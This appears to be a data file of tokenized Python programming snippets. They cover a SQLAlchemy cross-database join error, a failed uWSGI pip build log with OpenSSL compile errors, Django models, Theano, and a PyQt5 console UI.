"SELECT DISTINCT g.gene_symbol , o.orthofinder_id FROM eukarya.genes AS g JOIN annotations.orthofinder AS o ON g.gene_id=o.gene_id ; eukarya_engine = create_engine ( 'sqlite : ///eukarya_db.sqlite3 ' ) annotations_engine = create_engine ( 'sqlite : ///eukarya_annotations_db.sqlite3 ' ) meta = MetaData ( ) # This allows me to define cross database foreign keysEukarya = declarative_base ( bind=eukarya_engine , metadata=meta ) Annotations = declarative_base ( bind=annotations_engine , metadata=meta ) # I did the above in the hopes that by binding the engines this way , # would percolate through the schema , and sqlalchemy would be able # figure out which engine to use for each table.class Genes ( Eukarya ) : `` '' '' SQLalchemy object representing the Genes table in the Eukarya database . '' '' '' __tablename__ = 'genes ' gene_id = Column ( Integer , primary_key=True , unique=True ) gene_symbol = Column ( String ( 16 ) , index=True ) taxonomy_id = Column ( Integer , ForeignKey ( Species.taxonomy_id ) , index=True ) original_gene_id = Column ( String ) class Orthofinder ( Annotations ) : `` '' '' SQLalchemy object representing the Orthofinder table in the Annotations database . '' '' '' __tablename__ = 'orthofinder ' id = Column ( Integer , primary_key=True , autoincrement=True ) gene_id = Column ( Integer , ForeignKey ( Genes.gene_id ) , index=True ) orthofinder_id = Column ( String ( 10 ) , index=True ) Session = sessionmaker ( ) session = Session ( bind=eukarya_engine ) print ( session.query ( Genes.gene_symbol , Orthofinder.orthofinder_id ) . join ( Orthofinder ) .all ( ) .statement ) sqlalchemy.exc.OperationalError : ( sqlite3.OperationalError ) no such table : orthofinder [ SQL : 'SELECT genes.gene_symbol AS genes_gene_symbol , orthofinder.orthofinder_id AS orthofinder_orthofinder_id \nFROM genes JOIN orthofinder ON genes.gene_id = orthofinder.gene_id ' ]"
"last_exception = Nonetry : raise Exception ( 'foo failed ' ) except Exception as e : last_exception = e # this happens somewhere else , decoupled from the original raiseprint_exception_stack_trace ( last_exception )"
tests = unittest.TestLoader ( ) .discover ( 'tests ' ) unittest.TextTestRunner ( ) .run ( tests )
import theano as thimport theano.tensor as Tu = T.dmatrix ( ' u ' ) v = T.dmatrix ( ' v ' ) e = T.dscalar ( ' e ' ) a0 = T.dscalar ( 'a0 ' ) a1 = T.dscalar ( 'a1 ' ) dudt = u - u**3 -vdvdt = e* ( u - a1*v - a0 )
"Building wheels for collected packages : uWSGI Running setup.py bdist_wheel for uWSGI ... error Complete output from command /home/linevich/.virtualenvs/slated/bin/python2 -u -c `` import setuptools , tokenize ; __file__='/tmp/pip-build-vQVFMV/uWSGI/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' bdist_wheel -d /tmp/tmpwy9TAQpip-wheel- -- python-tag cp27 : running bdist_wheel running build running build_py creating build creating build/lib.linux-x86_64-2.7 copying uwsgidecorators.py - > build/lib.linux-x86_64-2.7 installing to build/bdist.linux-x86_64/wheel running install using profile : buildconf/default.ini detected include path : [ '/usr/lib/gcc/x86_64-linux-gnu/6/include ' , '/usr/local/include ' , '/usr/lib/gcc/x86_64-linux-gnu/6/include-fixed ' , '/usr/include/x86_64-linux-gnu ' , '/usr/include ' ] Patching `` bin_name '' to properly install_scripts dir detected CPU cores : 6 configured CFLAGS : -O2 -I . -Wall -Werror -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -fno-strict-aliasing -Wextra -Wno-unused-parameter -Wno-missing-field-initializers -DUWSGI_HAS_IFADDRS -DUWSGI_ZLIB -DUWSGI_LOCK_USE_MUTEX -DUWSGI_EVENT_USE_EPOLL -DUWSGI_EVENT_TIMER_USE_TIMERFD -DUWSGI_EVENT_FILEMONITOR_USE_INOTIFY -DUWSGI_PCRE -DUWSGI_ROUTING -DUWSGI_CAP -DUWSGI_UUID -DUWSGI_VERSION= '' \ '' 2.0.12\ '' '' -DUWSGI_VERSION_BASE= '' 2 '' -DUWSGI_VERSION_MAJOR= '' 0 '' -DUWSGI_VERSION_MINOR= '' 12 '' -DUWSGI_VERSION_REVISION= '' 0 '' -DUWSGI_VERSION_CUSTOM= '' \ '' \ '' '' -DUWSGI_YAML -DUWSGI_JSON -DUWSGI_SSL -I/usr/include/libxml2 -DUWSGI_XML -DUWSGI_XML_LIBXML2 -DUWSGI_PLUGIN_DIR= '' \ '' .\ '' '' -DUWSGI_DECLARE_EMBEDDED_PLUGINS= '' UDEP ( python ) ; UDEP ( gevent ) ; UDEP ( ping ) ; UDEP ( cache ) ; UDEP ( nagios ) ; UDEP ( rrdtool ) ; UDEP ( carbon ) ; UDEP ( rpc ) ; UDEP ( corerouter ) ; UDEP ( fastrouter ) ; UDEP ( http ) ; UDEP ( ugreen ) ; UDEP ( signal ) ; UDEP ( syslog ) ; UDEP ( rsyslog ) ; UDEP ( logsocket ) ; UDEP ( router_uwsgi ) ; UDEP ( router_redirect ) ; UDEP ( router_basicauth ) ; UDEP ( zergpool ) ; UDEP ( redislog ) ; UDEP ( mongodblog ) ; UDEP ( router_rewrite ) ; UDEP ( router_http ) ; UDEP ( logfile ) ; UDEP ( router_cache ) ; UDEP ( rawrouter ) ; UDEP ( router_static ) ; UDEP ( sslrouter ) ; UDEP ( spooler ) ; UDEP ( cheaper_busyness ) ; UDEP ( symcall ) ; UDEP ( transformation_tofile ) ; UDEP ( transformation_gzip ) ; UDEP ( transformation_chunked ) ; UDEP ( transformation_offload ) ; UDEP ( router_memcached ) ; UDEP ( router_redis ) ; UDEP ( router_hash ) ; UDEP ( router_expires ) ; UDEP ( router_metrics ) ; UDEP ( transformation_template ) ; UDEP ( stats_pusher_socket ) ; '' -DUWSGI_LOAD_EMBEDDED_PLUGINS= '' ULEP ( python ) ; ULEP ( gevent ) ; ULEP ( ping ) ; ULEP ( cache ) ; ULEP ( nagios ) ; ULEP ( rrdtool ) ; ULEP ( carbon ) ; ULEP ( rpc ) ; ULEP ( corerouter ) ; ULEP ( fastrouter ) ; ULEP ( http ) ; ULEP ( ugreen ) ; ULEP ( signal ) ; ULEP ( syslog ) ; ULEP ( rsyslog ) ; ULEP ( logsocket ) ; ULEP ( router_uwsgi ) ; ULEP ( router_redirect ) ; ULEP ( router_basicauth ) ; ULEP ( zergpool ) ; ULEP ( redislog ) ; ULEP ( mongodblog ) ; ULEP ( router_rewrite ) ; ULEP ( router_http ) ; ULEP ( logfile ) ; ULEP ( router_cache ) ; ULEP ( rawrouter ) ; ULEP ( router_static ) ; ULEP ( sslrouter ) ; ULEP ( spooler ) ; ULEP ( cheaper_busyness ) ; ULEP ( symcall ) ; ULEP ( transformation_tofile ) ; ULEP ( transformation_gzip ) ; ULEP ( transformation_chunked ) ; ULEP ( transformation_offload ) ; ULEP ( router_memcached ) ; ULEP ( router_redis ) ; ULEP ( router_hash ) ; ULEP ( router_expires ) ; ULEP ( router_metrics ) ; ULEP ( transformation_template ) ; ULEP ( stats_pusher_socket ) ; '' *** uWSGI compiling server core *** [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/utils.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/protocol.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/socket.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/logging.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/master.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/master_utils.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/emperor.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/notify.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/mule.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/subscription.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/stats.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/sendfile.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/async.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/master_checks.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/fifo.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/offload.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/io.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/static.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/websockets.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/spooler.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/snmp.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/exceptions.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/config.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/setup_utils.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/clock.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/init.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/buffer.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/reader.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/writer.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/alarm.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/cron.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/hooks.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/plugins.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/lock.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/cache.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/daemons.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/errors.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/hash.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/master_events.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/chunked.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/queue.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/event.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/signal.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/strings.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/progress.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/timebomb.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/ini.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/fsmon.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/mount.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/metrics.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/plugins_builder.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/sharedarea.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/rpc.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/gateway.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/loop.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/cookie.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/querystring.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/rb_timers.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/transformations.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] core/uwsgi.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] proto/base.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] proto/uwsgi.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] proto/http.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] proto/fastcgi.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] proto/scgi.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] proto/puwsgi.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] lib/linux_ns.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/zlib.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/regexp.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/routing.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/yaml.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/json.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/ssl.o [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/legion.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/xmlconf.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/dot_h.o [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] core/config_py.o *** uWSGI compiling embedded plugins *** [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] plugins/python/python_plugin.o core/ssl.c : In function ‘ uwsgi_ssl_init ’ : core/ssl.c:17:9 : error : ‘ OPENSSL_config ’ is deprecated [ -Werror=deprecated-declarations ] OPENSSL_config ( NULL ) ; ^~~~~~~~~~~~~~ In file included from /usr/include/openssl/crypto.h:32:0 , from /usr/include/openssl/bio.h:20 , from /usr/include/openssl/conf.h:13 , from ./uwsgi.h:358 , from core/ssl.c:1 : /usr/include/openssl/conf.h:92:1 : note : declared here DEPRECATEDIN_1_1_0 ( void OPENSSL_config ( const char *config_name ) ) ^ core/ssl.c : In function ‘ uwsgi_ssl_info_cb ’ : core/ssl.c:26:24 : error : dereferencing pointer to incomplete type ‘ SSL { aka const struct ssl_st } ’ if ( ssl- > s3 ) { ^~ core/ssl.c : In function ‘ uwsgi_ssl_session_new_cb ’ : core/ssl.c:62:69 : error : dereferencing pointer to incomplete type ‘ SSL_SESSION { aka struct ssl_session_st } ’ if ( uwsgi_cache_set2 ( uwsgi.ssl_sessions_cache , ( char * ) sess- > session_id , sess- > session_id_length , session_blob , len , uwsgi.ssl_sessions_timeout , 0 ) ) { ^~ core/ssl.c : In function ‘ uwsgi_ssl_new_server_context ’ : core/ssl.c:408:46 : error : passing argument 2 of ‘ SSL_CTX_sess_set_get_cb ’ from incompatible pointer type [ -Werror=incompatible-pointer-types ] SSL_CTX_sess_set_get_cb ( ctx , uwsgi_ssl_session_get_cb ) ; ^~~~~~~~~~~~~~~~~~~~~~~~ In file included from ./uwsgi.h:359:0 , from core/ssl.c:1 : /usr/include/openssl/ssl.h:637:6 : note : expected ‘ SSL_SESSION * ( * ) ( struct ssl_st * , const unsigned char * , int , int * ) { aka struct ssl_session_st * ( * ) ( struct ssl_st * , const unsigned char * , int , int * ) } ’ but argument is of type ‘ SSL_SESSION * ( * ) ( SSL * , unsigned char * , int , int * ) { aka struct ssl_session_st * ( * ) ( struct ssl_st * , unsigned char * , int , int * ) } ’ void SSL_CTX_sess_set_get_cb ( SSL_CTX *ctx , ^~~~~~~~~~~~~~~~~~~~~~~ core/legion.c : In function ‘ uwsgi_legion_register ’ : core/legion.c:1077:44 : error : invalid application of ‘ sizeof ’ to incomplete type ‘ EVP_CIPHER_CTX { aka struct evp_cipher_ctx_st } ’ EVP_CIPHER_CTX *ctx = uwsgi_malloc ( sizeof ( EVP_CIPHER_CTX ) ) ; ^~~~~~~~~~~~~~ core/legion.c:1112:45 : error : invalid application of ‘ sizeof ’ to incomplete type ‘ EVP_CIPHER_CTX { aka struct evp_cipher_ctx_st } ’ EVP_CIPHER_CTX *ctx2 = uwsgi_malloc ( sizeof ( EVP_CIPHER_CTX ) ) ; ^~~~~~~~~~~~~~ cc1 : all warnings being treated as errors -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Failed building wheel for uWSGI Running setup.py clean for uWSGIFailed to build uWSGIInstalling collected packages : uWSGI , versiontools , mock , django-grappelli , django-durationfield , PyJWT , backports.ssl-match-hostname , tornado , flower , pep8 , mccabe , pyflakes , flake8 , coverage , django-zebra , stripe , attrdict , django-filter , django-generic-helpers , Markdown , freezegun , parsimonious , django-timedeltafield , django-debug-toolbar , django-static-precompiler , smtpapi , sendgrid , sendgrid-django , unicodecsv , python-graph-core , python-graph-dot , xlrd , numpy , pandas , greenlet , gevent , grequests , django-taggit , idna , asn1crypto , pycparser , cffi , enum34 , cryptography , pyOpenSSL , ndg-httpsclient , pyasn1 , urllib3 , elasticsearch , elasticsearch-dsl , bungiesearch , celery-bungiesearch , django-crispy-forms , asgiref , attrs , Automat , zope.interface , constantly , hyperlink , incremental , twisted , txaio , autobahn , daphne , channels , pyasn1-modules , service-identity , msgpack-python , redis , asgi-redis , certifi , django-composite-field , django-email-bandit , django-haystack , django-messages , gviz-api Running setup.py install for uWSGI ... error Complete output from command /home/linevich/.virtualenvs/slated/bin/python2 -u -c `` import setuptools , tokenize ; __file__='/tmp/pip-build-vQVFMV/uWSGI/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /tmp/pip-MuWR9Q-record/install-record.txt -- single-version-externally-managed -- compile -- install-headers /home/linevich/.virtualenvs/slated/include/site/python2.7/uWSGI : running install using profile : buildconf/default.ini detected include path : [ '/usr/lib/gcc/x86_64-linux-gnu/6/include ' , '/usr/local/include ' , '/usr/lib/gcc/x86_64-linux-gnu/6/include-fixed ' , '/usr/include/x86_64-linux-gnu ' , '/usr/include ' ] Patching `` bin_name '' to properly install_scripts dir detected CPU cores : 6 configured CFLAGS : -O2 -I . -Wall -Werror -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -fno-strict-aliasing -Wextra -Wno-unused-parameter -Wno-missing-field-initializers -DUWSGI_HAS_IFADDRS -DUWSGI_ZLIB -DUWSGI_LOCK_USE_MUTEX -DUWSGI_EVENT_USE_EPOLL -DUWSGI_EVENT_TIMER_USE_TIMERFD -DUWSGI_EVENT_FILEMONITOR_USE_INOTIFY -DUWSGI_PCRE -DUWSGI_ROUTING -DUWSGI_CAP -DUWSGI_UUID -DUWSGI_VERSION= '' \ '' 2.0.12\ '' '' -DUWSGI_VERSION_BASE= '' 2 '' -DUWSGI_VERSION_MAJOR= '' 0 '' -DUWSGI_VERSION_MINOR= '' 12 '' -DUWSGI_VERSION_REVISION= '' 0 '' -DUWSGI_VERSION_CUSTOM= '' \ '' \ '' '' -DUWSGI_YAML -DUWSGI_JSON -DUWSGI_SSL -I/usr/include/libxml2 -DUWSGI_XML -DUWSGI_XML_LIBXML2 -DUWSGI_PLUGIN_DIR= '' \ '' .\ '' '' -DUWSGI_DECLARE_EMBEDDED_PLUGINS= '' UDEP ( python ) ; UDEP ( gevent ) ; UDEP ( ping ) ; UDEP ( cache ) ; UDEP ( nagios ) ; UDEP ( rrdtool ) ; UDEP ( carbon ) ; UDEP ( rpc ) ; UDEP ( corerouter ) ; UDEP ( fastrouter ) ; UDEP ( http ) ; UDEP ( ugreen ) ; UDEP ( signal ) ; UDEP ( syslog ) ; UDEP ( rsyslog ) ; UDEP ( logsocket ) ; UDEP ( router_uwsgi ) ; UDEP ( router_redirect ) ; UDEP ( router_basicauth ) ; UDEP ( zergpool ) ; UDEP ( redislog ) ; UDEP ( mongodblog ) ; UDEP ( router_rewrite ) ; UDEP ( router_http ) ; UDEP ( logfile ) ; UDEP ( router_cache ) ; UDEP ( rawrouter ) ; UDEP ( router_static ) ; UDEP ( sslrouter ) ; UDEP ( spooler ) ; UDEP ( cheaper_busyness ) ; UDEP ( symcall ) ; UDEP ( transformation_tofile ) ; UDEP ( transformation_gzip ) ; UDEP ( transformation_chunked ) ; UDEP ( transformation_offload ) ; UDEP ( router_memcached ) ; UDEP ( router_redis ) ; UDEP ( router_hash ) ; UDEP ( router_expires ) ; UDEP ( router_metrics ) ; UDEP ( transformation_template ) ; UDEP ( stats_pusher_socket ) ; '' -DUWSGI_LOAD_EMBEDDED_PLUGINS= '' ULEP ( python ) ; ULEP ( gevent ) ; ULEP ( ping ) ; ULEP ( cache ) ; ULEP ( nagios ) ; ULEP ( rrdtool ) ; ULEP ( carbon ) ; ULEP ( rpc ) ; ULEP ( corerouter ) ; ULEP ( fastrouter ) ; ULEP ( http ) ; ULEP ( ugreen ) ; ULEP ( signal ) ; ULEP ( syslog ) ; ULEP ( rsyslog ) ; ULEP ( logsocket ) ; ULEP ( router_uwsgi ) ; ULEP ( router_redirect ) ; ULEP ( router_basicauth ) ; ULEP ( zergpool ) ; ULEP ( redislog ) ; ULEP ( mongodblog ) ; ULEP ( router_rewrite ) ; ULEP ( router_http ) ; ULEP ( logfile ) ; ULEP ( router_cache ) ; ULEP ( rawrouter ) ; ULEP ( router_static ) ; ULEP ( sslrouter ) ; ULEP ( spooler ) ; ULEP ( cheaper_busyness ) ; ULEP ( symcall ) ; ULEP ( transformation_tofile ) ; ULEP ( transformation_gzip ) ; ULEP ( transformation_chunked ) ; ULEP ( transformation_offload ) ; ULEP ( router_memcached ) ; ULEP ( router_redis ) ; ULEP ( router_hash ) ; ULEP ( router_expires ) ; ULEP ( router_metrics ) ; ULEP ( transformation_template ) ; ULEP ( stats_pusher_socket ) ; '' *** uWSGI compiling server core *** core/utils.o is up to date core/protocol.o is up to date core/socket.o is up to date core/logging.o is up to date core/master.o is up to date core/master_utils.o is up to date core/emperor.o is up to date core/notify.o is up to date core/mule.o is up to date core/subscription.o is up to date core/stats.o is up to date core/sendfile.o is up to date core/async.o is up to date core/master_checks.o is up to date core/fifo.o is up to date core/offload.o is up to date core/io.o is up to date core/static.o is up to date core/websockets.o is up to date core/spooler.o is up to date core/snmp.o is up to date core/exceptions.o is up to date core/config.o is up to date core/setup_utils.o is up to date core/clock.o is up to date core/init.o is up to date core/buffer.o is up to date core/reader.o is up to date core/writer.o is up to date core/alarm.o is up to date core/cron.o is up to date core/hooks.o is up to date core/plugins.o is up to date core/lock.o is up to date core/cache.o is up to date core/daemons.o is up to date core/errors.o is up to date core/hash.o is up to date core/master_events.o is up to date core/chunked.o is up to date core/queue.o is up to date core/event.o is up to date core/signal.o is up to date core/strings.o is up to date core/progress.o is up to date core/timebomb.o is up to date core/ini.o is up to date core/fsmon.o is up to date core/mount.o is up to date core/metrics.o is up to date core/plugins_builder.o is up to date core/sharedarea.o is up to date core/rpc.o is up to date core/gateway.o is up to date core/loop.o is up to date core/cookie.o is up to date core/querystring.o is up to date core/rb_timers.o is up to date core/transformations.o is up to date core/uwsgi.o is up to date proto/base.o is up to date proto/uwsgi.o is up to date proto/http.o is up to date proto/fastcgi.o is up to date proto/scgi.o is up to date proto/puwsgi.o is up to date lib/linux_ns.o is up to date core/zlib.o is up to date core/regexp.o is up to date core/routing.o is up to date core/yaml.o is up to date core/json.o is up to date [ thread 1 ] [ x86_64-linux-gnu-gcc -pthread ] core/ssl.o [ thread 2 ] [ x86_64-linux-gnu-gcc -pthread ] core/legion.o core/xmlconf.o is up to date [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] core/dot_h.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] core/config_py.o *** uWSGI compiling embedded plugins *** plugins/python/python_plugin.o is up to date [ thread 0 ] [ x86_64-linux-gnu-gcc -pthread ] plugins/python/pyutils.o [ thread 3 ] [ x86_64-linux-gnu-gcc -pthread ] plugins/python/pyloader.o [ thread 4 ] [ x86_64-linux-gnu-gcc -pthread ] plugins/python/wsgi_handlers.o [ thread 5 ] [ x86_64-linux-gnu-gcc -pthread ] plugins/python/wsgi_headers.o core/ssl.c : In function ‘ uwsgi_ssl_init ’ : core/ssl.c:17:9 : error : ‘ OPENSSL_config ’ is deprecated [ -Werror=deprecated-declarations ] OPENSSL_config ( NULL ) ; ^~~~~~~~~~~~~~ In file included from /usr/include/openssl/crypto.h:32:0 , from /usr/include/openssl/bio.h:20 , from /usr/include/openssl/conf.h:13 , from ./uwsgi.h:358 , from core/ssl.c:1 : /usr/include/openssl/conf.h:92:1 : note : declared here DEPRECATEDIN_1_1_0 ( void OPENSSL_config ( const char *config_name ) ) ^ core/ssl.c : In function ‘ uwsgi_ssl_info_cb ’ : core/ssl.c:26:24 : error : dereferencing pointer to incomplete type ‘ SSL { aka const struct ssl_st } ’ if ( ssl- > s3 ) { ^~ core/ssl.c : In function ‘ uwsgi_ssl_session_new_cb ’ : core/ssl.c:62:69 : error : dereferencing pointer to incomplete type ‘ SSL_SESSION { aka struct ssl_session_st } ’ if ( uwsgi_cache_set2 ( uwsgi.ssl_sessions_cache , ( char * ) sess- > session_id , sess- > session_id_length , session_blob , len , uwsgi.ssl_sessions_timeout , 0 ) ) { ^~ core/ssl.c : In function ‘ uwsgi_ssl_new_server_context ’ : core/ssl.c:408:46 : error : passing argument 2 of ‘ SSL_CTX_sess_set_get_cb ’ from incompatible pointer type [ -Werror=incompatible-pointer-types ] SSL_CTX_sess_set_get_cb ( ctx , uwsgi_ssl_session_get_cb ) ; ^~~~~~~~~~~~~~~~~~~~~~~~ In file included from ./uwsgi.h:359:0 , from core/ssl.c:1 : /usr/include/openssl/ssl.h:637:6 : note : expected ‘ SSL_SESSION * ( * ) ( struct ssl_st * , const unsigned char * , int , int * ) { aka struct ssl_session_st * ( * ) ( struct ssl_st * , const unsigned char * , int , int * ) } ’ but argument is of type ‘ SSL_SESSION * ( * ) ( SSL * , unsigned char * , int , int * ) { aka struct ssl_session_st * ( * ) ( struct ssl_st * , unsigned char * , int , int * ) } ’ void SSL_CTX_sess_set_get_cb ( SSL_CTX *ctx , ^~~~~~~~~~~~~~~~~~~~~~~ core/legion.c : In function ‘ uwsgi_legion_register ’ : core/legion.c:1077:44 : error : invalid application of ‘ sizeof ’ to incomplete type ‘ EVP_CIPHER_CTX { aka struct evp_cipher_ctx_st } ’ EVP_CIPHER_CTX *ctx = uwsgi_malloc ( sizeof ( EVP_CIPHER_CTX ) ) ; ^~~~~~~~~~~~~~ core/legion.c:1112:45 : error : invalid application of ‘ sizeof ’ to incomplete type ‘ EVP_CIPHER_CTX { aka struct evp_cipher_ctx_st } ’ EVP_CIPHER_CTX *ctx2 = uwsgi_malloc ( sizeof ( EVP_CIPHER_CTX ) ) ; ^~~~~~~~~~~~~~ cc1 : all warnings being treated as errors -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Command `` /home/linevich/.virtualenvs/slated/bin/python2 -u -c `` import setuptools , tokenize ; __file__='/tmp/pip-build-vQVFMV/uWSGI/setup.py ' ; f=getattr ( tokenize , 'open ' , open ) ( __file__ ) ; code=f.read ( ) .replace ( '\r\n ' , '\n ' ) ; f.close ( ) ; exec ( compile ( code , __file__ , 'exec ' ) ) '' install -- record /tmp/pip-MuWR9Q-record/install-record.txt -- single-version-externally-managed -- compile -- install-headers /home/linevich/.virtualenvs/slated/include/site/python2.7/uWSGI '' failed with error code 1 in /tmp/pip-build-vQVFMV/uWSGI/"
"class Cart ( models.Model ) : user = models.OneToOneField ( User ) class CartItem ( models.Model ) : cart = models.ForeignKey ( Cart ) product = models.ForeignKey ( Product , verbose_name= '' produs '' )"
"> > > for i in range ( 10 ) : ... time.sleep ( 1 ) ... print ( i ) ... < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < ui version= '' 4.0 '' > < class > main_window < /class > < widget class= '' QMainWindow '' name= '' main_window '' > < property name= '' geometry '' > < rect > < x > 0 < /x > < y > 0 < /y > < width > 800 < /width > < height > 600 < /height > < /rect > < /property > < property name= '' sizePolicy '' > < sizepolicy hsizetype= '' Preferred '' vsizetype= '' Preferred '' > < horstretch > 0 < /horstretch > < verstretch > 0 < /verstretch > < /sizepolicy > < /property > < property name= '' windowTitle '' > < string > MainWindow < /string > < /property > < property name= '' tabShape '' > < enum > QTabWidget : :Rounded < /enum > < /property > < widget class= '' QWidget '' name= '' central_widget '' > < layout class= '' QHBoxLayout '' name= '' horizontalLayout '' > < item > < layout class= '' QVBoxLayout '' name= '' console_layout '' > < item > < widget class= '' QTextEdit '' name= '' console_log '' > < property name= '' undoRedoEnabled '' > < bool > false < /bool > < /property > < /widget > < /item > < item > < layout class= '' QHBoxLayout '' name= '' horizontalLayout_4 '' > < item > < widget class= '' QLabel '' name= '' console_prompt '' > < property name= '' text '' > < string/ > < /property > < /widget > < /item > < item > < widget class= '' QLineEdit '' name= '' console_input '' > < property name= '' frame '' > < bool > true < /bool > < /property > < /widget > < /item > < /layout > < /item > < /layout > < /item > < /layout > < /widget > < widget class= '' QMenuBar '' name= '' menu_bar '' > < property name= '' geometry '' > < rect > < x > 0 < /x > < y > 0 < /y > < width > 800 < /width > < height > 26 < /height > < /rect > < /property > < /widget > < widget class= '' QStatusBar '' name= '' status_bar '' / > < /widget > < resources/ > < connections/ > < /ui > import sysfrom code import InteractiveConsolefrom io import StringIOfrom queue import Queue , Emptyfrom PyQt5 import uicfrom PyQt5.QtCore import pyqtSlot , QThread , QObject , pyqtSignal , QTimerfrom PyQt5.QtGui import QTextOption , QTextCursorfrom PyQt5.QtWidgets import QApplication__author__ = `` daegontaven '' __copyright__ = `` daegontaven '' __license__ = `` gpl3 '' class BaseSignals ( QObject ) : `` '' '' Standard set of pyqtSignals. `` '' '' signal_str = pyqtSignal ( str ) signal_int = pyqtSignal ( int ) signal_float = pyqtSignal ( float ) signal_list = pyqtSignal ( list ) signal_tuple = pyqtSignal ( tuple ) signal_dict = pyqtSignal ( dict ) signal_object = pyqtSignal ( object ) def __init__ ( self ) : QObject.__init__ ( self ) class DelayedBuffer ( QObject ) : `` '' '' A buffer that uses a queue to store strings . It removes the first appended string first in a constant interval. `` '' '' written = pyqtSignal ( str ) def __init__ 